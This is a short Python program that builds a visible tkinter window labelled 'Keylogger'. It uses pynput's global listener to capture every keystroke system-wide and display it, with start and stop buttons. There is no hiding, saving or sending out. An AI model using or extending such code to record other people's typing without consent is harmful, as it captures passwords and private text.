import tkinter as tk
from tkinter import ttk
from pynput import keyboard

class KeyloggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger")
        self.root.geometry("400x300")

        self.textbox = tk.Text(self.root, height=10, width=40)
        self.textbox.pack(pady=10)

        self.start_button = ttk.Button(self.root, text="Start Keylogger", command=self.start_keylogger)
        self.start_button.pack()

        self.stop_button = ttk.Button(self.root, text="Stop Keylogger", command=self.stop_keylogger)
        self.stop_button.pack()

        self.listener = None

    def on_press(self, key):
        char = None
        try:
            char = key.char
        except AttributeError:
            if key == keyboard.Key.space:
                char = " "
            elif key == keyboard.Key.enter:
                char = "\n"
            else:
                char = f" [{key}] "

        if char:
            self.textbox.insert(tk.END, char)

    def start_keylogger(self):
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        self.start_button.config(state="disabled")
        self.stop_button.config(state="normal")

    def stop_keylogger(self):
        if self.listener:
            self.listener.stop()
        self.start_button.config(state="normal")
        self.stop_button.config(state="disabled")

if __name__ == "__main__":
    root = tk.Tk()
    keylogger_gui = KeyloggerGUI(root)
    root.mainloop()
